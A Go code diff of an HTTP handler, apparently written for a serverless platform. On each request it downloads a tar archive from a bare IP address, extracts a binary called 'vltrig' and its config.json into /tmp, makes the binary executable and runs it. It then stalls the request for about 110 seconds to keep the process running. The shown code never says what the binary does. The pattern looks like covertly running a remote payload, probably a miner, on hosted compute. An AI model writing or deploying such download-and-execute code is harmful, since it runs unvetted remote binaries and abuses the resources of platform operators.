@@ -22,16 +22,17 @@ var (
 func Handler(w http.ResponseWriter, r *http.Request) {
 	log.Println("[INFO] --- 收到新请求 ---")
 	binPath := "/tmp/vltrig"
+	configPath := "/tmp/config.json"
 
-	// 1. 文件复用检测
+	// 1. 容器复用检测（检查二进制文件是否存在）
 	if _, err := os.Stat(binPath); os.IsNotExist(err) {
 		log.Println("[INFO] 未检测到可执行文件，开始下载并解压...")
-		if err := downloadAndExtract(binPath); err != nil {
+		if err := downloadAndExtract(binPath, configPath); err != nil {
 			log.Printf("[ERROR] 下载或解压失败: %v\n", err)
 			http.Error(w, "下载或解压失败: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		log.Println("[INFO] 下载解压完成，开始赋权...")
+		log.Println("[INFO] 下载解压完成，开始对二进制文件赋权...")
 		if err := os.Chmod(binPath, 0755); err != nil {
 			log.Printf("[ERROR] 赋权失败: %v\n", err)
 			http.Error(w, "赋权执行权限失败: "+err.Error(), http.StatusInternalServerError)
@@ -46,9 +47,11 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
 	if !isRunning {
 		log.Println("[INFO] 程序未运行，准备启动 vltrig...")
-		cmd := exec.Command(binPath)
 		
-		// 捕获程序的标准输出和错误输出，方便在日志里看它有没有报错
+		// 【修改点 2 & 3】：带上配置文件参数，并指定工作目录
+		cmd := exec.Command(binPath, "-c", configPath)
+		cmd.Dir = "/tmp" // 指定运行目录为 /tmp，防止程序在只读区写日志报错
+		
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 
@@ -81,9 +84,6 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 
 	// 3. 挂起等待
 	log.Println("[INFO] 开始挂起等待，预计 110 秒...")
-	
-	// 使用分段 Sleep，防止一直无响应
-	// 这样能在挂起过程中输出日志，证明程序没死
 	for i := 1; i <= 11; i++ {
 		time.Sleep(10 * time.Second)
 		log.Printf("[INFO] 已挂起等待 %d0 秒...", i)
@@ -98,10 +98,10 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-func downloadAndExtract(binPath string) error {
-	// 【关键修复】加入 15 秒超时时间，防止网络不通导致无限挂死！
+// 【修改点 1】：解压逻辑支持同时提取多个文件
+func downloadAndExtract(binDest, configDest string) error {
 	client := &http.Client{
-		Timeout: 15 * time.Second,
+		Timeout: 20 * time.Second, // 放宽一点超时时间以防网络抖动
 	}
 
 	log.Println("[INFO] 发起 HTTP GET 请求: http://94.131.19.66/vltrig.tar")
@@ -115,31 +115,61 @@ func downloadAndExtract(binPath string) error {
 		return errors.New("HTTP状态码非200: " + resp.Status)
 	}
 
-	log.Println("[INFO] HTTP 请求成功，开始流式解压 tar 包...")
+	log.Println("[INFO] 开始流式解压 tar 包...")
 	tr := tar.NewReader(resp.Body)
+	
+	foundBin := false
+	foundConfig := false
+
+	// 遍历整个 tar 包
 	for {
 		hdr, err := tr.Next()
 		if err == io.EOF {
-			break
+			break // 读完整个压缩包
 		}
 		if err != nil {
 			return errors.New("读取 tar 包失败: " + err.Error())
 		}
 
+		// 匹配并提取 vltrig
 		if hdr.Name == "vltrig" || strings.HasSuffix(hdr.Name, "/vltrig") {
-			log.Println("[INFO] 找到目标文件，准备写入磁盘...")
-			outFile, err := os.OpenFile(binPath, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)
-			if err != nil {
-				return err
+			log.Println("[INFO] 发现 vltrig，准备写入...")
+			if err := writeFileFromTar(binDest, tr); err != nil {
+				return errors.New("写入 vltrig 失败: " + err.Error())
 			}
-			_, err = io.Copy(outFile, tr)
-			outFile.Close()
-			if err != nil {
-				return err
+			foundBin = true
+		}
+
+		// 匹配并提取 config.json
+		if hdr.Name == "config.json" || strings.HasSuffix(hdr.Name, "/config.json") {
+			log.Println("[INFO] 发现 config.json，准备写入...")
+			if err := writeFileFromTar(configDest, tr); err != nil {
+				return errors.New("写入 config.json 失败: " + err.Error())
 			}
-			log.Println("[INFO] 文件写入成功。")
-			return nil
+			foundConfig = true
 		}
 	}
-	return errors.New("未在 tar 包中找到 vltrig 程序")
+
+	if !foundBin {
+		return errors.New("解压失败: 未在 tar 包中找到 vltrig 程序")
+	}
+	if !foundConfig {
+		log.Println("[WARN] 未在 tar 包中找到 config.json，程序可能会启动失败！")
+	} else {
+		log.Println("[INFO] 二进制文件和配置文件全部提取成功。")
+	}
+
+	return nil
+}
+
+// 辅助函数：将 tar 中的文件流写入到指定路径
+func writeFileFromTar(destPath string, tr io.Reader) error {
+	outFile, err := os.OpenFile(destPath, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)
+	if err != nil {
+		return err
+	}
+	defer outFile.Close()
+	
+	_, err = io.Copy(outFile, tr)
+	return err
 }
